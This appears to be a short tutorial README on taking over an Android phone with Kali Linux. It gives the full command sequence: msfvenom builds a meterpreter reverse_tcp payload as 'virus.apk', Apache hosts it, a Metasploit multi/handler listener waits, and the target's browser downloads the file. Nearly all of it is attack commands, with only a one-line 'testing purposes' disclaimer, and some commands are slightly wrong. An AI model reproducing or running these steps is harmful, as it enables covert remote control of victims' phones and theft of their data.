# How to hack a smarphone with Kali Linux (complete guide)
Kali linux is an OS that is focused on pentesting and ethical hacking. It if totally free and open source. In this guide you will see how you can test to gain acces to a phone with some pentesting tools. ONLY USE THIS FOR TESTING PURPOSES. **There is a file uploaded with all the configuration done. You can download it and just run the msfconsole comands at the end of the guide.**

**More info at https://www.kali.org/**

## 1) Creating the maliciuos file
The first thing that we need to make, is to create a malicious file with the correct parameters as for making a connection between our computer and the affected device.
#### `msfvenom -p android/meterpreter/reverse_tcp LHOST=(ENTER YOUR IP ADRESS WITHOUT THE BRACKETS) LPORT=8080  R> virus.apk`

**You can know th IP adress of your device by entering ```ifconfig```**

## 2) Uploading the file to an apache server.
This method consists in uploading the file to a server that is hosted by the linux machine. You can make shure if it is running by entering this command.

```sudo service apache2 status```

**If you see as an output that it is offline, then turn it on with the following command.**

```sudo service apache2 start```

### 3) Copying the files to the apache online server
Now, we need to copy the malicoius file to the apache directory, in order for making it accesible on the internet.

```scp virus.apk /var/www/html/```

 **Verify if the file has been uploaded with this command**
 
 ```cd /var/www/html/ & ls```
 
 ## 4) Setting up the msfconsole
 
 Now we need to set up a listener in order for capturing any activity signals from a victim. In order to do so, enter the following commands.
 
 **Start the console** ```msfconsole```
 
 **Start the multi handler** ```use multi/handler```
 
 **Set the payload** ```set PAYLOAD android/meterpreter/reverse_tcp```
 
 **Set the Host IP** ```set LHOST (THE IP ADRESS USED BEFORE WITHOUT THE BRACKETS)```
 
 **Set the port** ```set LPORT 8080```
 
 **Start the process!** ``exploit``
 
 ## 5) Downloading the malicous file in the target device.
 
 Open the phones browser, and type the ip adress as you did before followed by this ```/virus.apk```
 
 **The link should look something like this; 192.168.0.152/virus.apk**

##**The process is finally done. You can now try atacking the phone with the console. Type ```help``` to list all the commands aviable**

